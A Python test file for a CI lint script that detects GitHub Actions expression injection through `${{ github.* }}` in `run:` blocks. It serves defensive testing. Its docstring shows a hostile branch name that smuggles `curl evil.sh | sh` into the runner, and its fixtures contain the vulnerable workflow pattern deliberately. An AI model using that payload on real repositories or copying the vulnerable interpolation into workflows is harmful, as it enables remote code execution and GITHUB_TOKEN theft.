"""Issue #574: workflow ``run:`` blocks must not interpolate ``${{ github.* }}``.

GitHub expands workflow expressions BEFORE the shell parses a ``run:``
script, so untrusted ``github.*`` values (``head_ref`` / ``title`` /
``event.pull_request.*`` on a fork PR — ``ref_name`` on a crafted tag)
become classic expression injection: a branch named
``develop"; curl evil.sh | sh; #`` executes in the runner with the job's
GITHUB_TOKEN. The fix is env-var indirection (issue #301's PR-body guard
pattern); these tests import :mod:`check_workflow_run_injections` — the
same module the CI lint job runs — and verify it over the committed
workflows plus synthetic fixtures. The local suite is the load-bearing
fence; the CI step is the wall for forks without the dev environment.
"""

from __future__ import annotations

import importlib.util
import pathlib
import textwrap

ROOT = pathlib.Path(__file__).resolve().parents[1]
SCRIPTS_DIR = ROOT / "scripts"

# Import via importlib so the file is loaded by path (same convention as
# tests/test_auto_close_issues.py) — scripts/ is not a package.
_spec = importlib.util.spec_from_file_location(
    "check_workflow_run_injections",
    SCRIPTS_DIR / "check_workflow_run_injections.py",
)
assert _spec is not None and _spec.loader is not None
check_workflow_run_injections = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(check_workflow_run_injections)


def write_workflow(directory: pathlib.Path, body: str, name: str = "fixture.yml") -> pathlib.Path:
    """Write a synthetic workflow under ``directory`` and return its path."""
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / name
    path.write_text(textwrap.dedent(body), encoding="utf-8")
    return path


def test_repo_workflows_pass_the_injection_guard() -> None:
    """The committed .github/workflows carry no github.* inside run: blocks."""
    violations = check_workflow_run_injections.scan_dir(ROOT / ".github" / "workflows")
    assert violations == []


def test_guard_flags_injected_shapes(tmp_path: pathlib.Path) -> None:
    """A tmp tree shaped like the pre-#574 ci.yml is flagged — proves the
    guard catches the exact historical pattern (one violation per affected
    step, naming the file, the job, and the step)."""
    write_workflow(
        tmp_path,
        """
        name: fixture
        on: push
        jobs:
          guard-branch-pairing:
            runs-on: ubuntu-latest
            steps:
              - name: main may only receive PRs from develop
                run: |
                  if [ "${{ github.head_ref }}" != "develop" ]; then
                    echo "::error::got '${{ github.head_ref }}'."
                    exit 1
                  fi
        """,
    )
    violations = check_workflow_run_injections.scan_dir(tmp_path)
    assert len(violations) == 1
    assert "guard-branch-pairing" in violations[0]
    assert "main may only receive PRs from develop" in violations[0]
    assert "issue #574" in violations[0]


def test_guard_flags_untrusted_expressions_in_plain_run_scalars(
    tmp_path: pathlib.Path,
) -> None:
    """Plain (non-block) run: scalars are scanned too — `- run: echo
    ${{ github.<untrusted> }}` is just as injectable, for every value the
    issue enumerates (head_ref / title / event.pull_request.*)."""
    untrusted = [
        "github.head_ref",
        "github.title",
        "github.event.pull_request.body",
        "github.event.pull_request.title",
    ]
    for index, expr in enumerate(untrusted):
        write_workflow(
            tmp_path,
            f"""
            name: fixture-{index}
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - run: echo "value=${{{{ {expr} }}}}"
            """,
            name=f"fixture-{index}.yml",
        )
    violations = check_workflow_run_injections.scan_dir(tmp_path)
    assert len(violations) == len(untrusted)
    for expr in untrusted:
        # each untrusted expression surfaces in its own violation, quoted
        # with the offending line
        assert any(expr in v for v in violations), expr


def test_guard_allows_env_indirection_shape(tmp_path: pathlib.Path) -> None:
    """The post-#574 shape is NOT flagged: env:/with:/if: blocks carry the
    `${{ github.* }}`` indirection, and the run: block reads only quoted
    shell variables (mirror of the #301 PR-body guard)."""
    write_workflow(
        tmp_path,
        """
        name: fixture
        on:
          pull_request:
            branches: [develop, main]
        jobs:
          guard-branch-pairing:
            if: github.event_name == 'pull_request' && github.base_ref == 'main'
            runs-on: ubuntu-latest
            steps:
              - name: main may only receive PRs from develop
                env:
                  HEAD_REF: ${{ github.head_ref }}
                run: |
                  if [ "${HEAD_REF}" != "develop" ]; then
                    echo "::error::got '${HEAD_REF}'."
                    exit 1
                  fi
              - name: login
                uses: docker/login-action@0000000000000000000000000000000000000000
                with:
                  username: ${{ github.actor }}
                  password: ${{ secrets.GITHUB_TOKEN }}
        """,
    )
    violations = check_workflow_run_injections.scan_dir(tmp_path)
    assert violations == []
